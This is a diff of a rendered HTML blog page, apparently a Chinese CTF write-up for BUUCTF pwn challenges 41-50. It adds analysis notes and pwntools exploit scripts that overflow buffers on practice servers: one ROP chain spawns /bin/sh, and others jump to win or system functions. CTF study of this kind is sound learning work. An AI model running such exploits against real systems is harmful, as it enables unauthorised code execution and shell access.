-<p><img src="/../../../images/41-50/image-20231012203912182.png" srcset="/img/loading.gif" lazyload alt="image-20231012203912182"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012203912182.png" srcset="/img/loading.gif" lazyload alt="image-20231012203912182"></p>
 <p>read漏洞</p>
 <p>fflush</p>
-<p><img src="/../../../images/41-50/image-20231012203948137.png" srcset="/img/loading.gif" lazyload alt="image-20231012203948137"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012203948137.png" srcset="/img/loading.gif" lazyload alt="image-20231012203948137"></p>
 <p>check_one_fd</p>
-<p><img src="/../../../images/41-50/image-20231012204031710.png" srcset="/img/loading.gif" lazyload alt="image-20231012204031710"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012204031710.png" srcset="/img/loading.gif" lazyload alt="image-20231012204031710"></p>
 <h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><p>exp1</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26841</span>)<br><span class="hljs-comment">#io = process(&#x27;./47&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>padding=<span class="hljs-number">0x20</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">payload</span>():	<br>    <span class="hljs-comment"># Padding goes here</span><br>	p = <span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e82a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080bae06</span>) <span class="hljs-comment"># pop eax ; ret</span><br>	p += <span class="hljs-string">b&#x27;/bin&#x27;</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0809a15d</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e82a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080bae06</span>) <span class="hljs-comment"># pop eax ; ret</span><br>	p += <span class="hljs-string">b&#x27;//sh&#x27;</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0809a15d</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>	p += pack(<span class="hljs-string">b&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e850</span>) <span class="hljs-comment"># pop_edx_ecx_ebx</span><br>	p += p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x080ea060</span>)<br>	p += pack(<span class="hljs-string">b&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080bae06</span>) <span class="hljs-comment"># pop eax ; ret</span><br>	p += p32(<span class="hljs-number">0xb</span>)<br>	p += pack(<span class="hljs-string">b&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080493e1</span>) <span class="hljs-comment"># int 0x80</span><br><br>	<span class="hljs-keyword">return</span> p<br><br>shell = payload()<br>io.sendline(shell)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
@@ -394,13 +414,35 @@
 
 
 
-<h1 id="48-picoctf-2018-buffer-overflow-2"><a href="#48-picoctf-2018-buffer-overflow-2" class="headerlink" title="48.picoctf_2018_buffer overflow 2"></a>48.picoctf_2018_buffer overflow 2</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231012105153324.png" srcset="/img/loading.gif" lazyload alt="image-20231012105153324"></p>
-<h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>
+<h1 id="48-picoctf-2018-buffer-overflow-2"><a href="#48-picoctf-2018-buffer-overflow-2" class="headerlink" title="48.picoctf_2018_buffer overflow 2"></a>48.picoctf_2018_buffer overflow 2</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105153324.png" srcset="/img/loading.gif" lazyload alt="image-20231012105153324"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141423542.png" srcset="/img/loading.gif" lazyload alt="image-20231014141423542"></p>
+<p>vuln</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141452804.png" srcset="/img/loading.gif" lazyload alt="image-20231014141452804"></p>
+<p>gets漏洞</p>
+<p>win</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141520555.png" srcset="/img/loading.gif" lazyload alt="image-20231014141520555"></p>
+<p>可以看到win函数中a1 &#x3D;&#x3D; 0xDEADBEEF &amp;&amp; a2 &#x3D;&#x3D; 0xDEADCODE 时，输出flag.</p>
+<h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26873</span>)<br><span class="hljs-comment">#io=process(&#x27;./48&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./48&#x27;</span>)<br><br>win_addr=<span class="hljs-number">0x80485cb</span>	<span class="hljs-comment">#flag</span><br>vuln_addr=elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>a1=<span class="hljs-number">0xDEADBEEF</span><br>a2=<span class="hljs-number">0xDEADC0DE</span><br>padding=<span class="hljs-number">0x70</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(a1)+p32(a2)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="49-wustctf2020-getshell-2"><a href="#49-wustctf2020-getshell-2" class="headerlink" title="49.wustctf2020_getshell_2"></a>49.wustctf2020_getshell_2</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231012105215869.png" srcset="/img/loading.gif" lazyload alt="image-20231012105215869"></p>
-<h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>
+<h1 id="49-wustctf2020-getshell-2"><a href="#49-wustctf2020-getshell-2" class="headerlink" title="49.wustctf2020_getshell_2"></a>49.wustctf2020_getshell_2</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105215869.png" srcset="/img/loading.gif" lazyload alt="image-20231012105215869"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019084106789.png" srcset="/img/loading.gif" lazyload alt="image-20231019084106789"></p>
+<p>vulnerable</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019084132586.png" srcset="/img/loading.gif" lazyload alt="image-20231019084132586"></p>
+<p>read漏洞</p>
+<p>shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019085340130.png" srcset="/img/loading.gif" lazyload alt="image-20231019085340130"></p>
+<p>没法利用<code>system@plt</code>地址，因为plt地址需要返回值，可溢出的地址位数不够<code>0x24-0x18=0xc</code>，所以只能用<code>shell()</code>里的<code>call system</code>来调用system，call函数不用返回值了，它会自己把下一条指令给压进去</p>
+<h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27488</span>)<br><span class="hljs-comment">#io=process(&#x27;./49&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./49&#x27;</span>)<br><br>sh_addr=<span class="hljs-number">0x8048670</span><br>system_addr=<span class="hljs-number">0x8048529</span><br>padding=<span class="hljs-number">0x1c</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(sh_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="50-bbys-tu-2016"><a href="#50-bbys-tu-2016" class="headerlink" title="50.bbys_tu_2016"></a>50.bbys_tu_2016</h1><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231012105233326.png" srcset="/img/loading.gif" lazyload alt="image-20231012105233326"></p>
+<h1 id="50-bbys-tu-2016"><a href="#50-bbys-tu-2016" class="headerlink" title="50.bbys_tu_2016"></a>50.bbys_tu_2016</h1><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105233326.png" srcset="/img/loading.gif" lazyload alt="image-20231012105233326"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019093628174.png" srcset="/img/loading.gif" lazyload alt="image-20231019093628174"></p>
+<p>__isoc99_scanf漏洞</p>
+<p>printFlag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019093710374.png" srcset="/img/loading.gif" lazyload alt="image-20231019093710374"></p>
+<p>读了flag</p>
 <h2 id="2-payload-9"><a href="#2-payload-9" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>
 
 
@@ -507,12 +549,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2024/01/23/WP/BUUCTF/51-60/" title="51~60">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">51~60</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/" title="栈溢出总结">
-                        <span class="hidden-mobile">栈溢出总结</span>
+                      <a href="/2023/09/22/WP/BUUCTF/31-40/" title="31~40">
+                        <span class="hidden-mobile">31~40</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
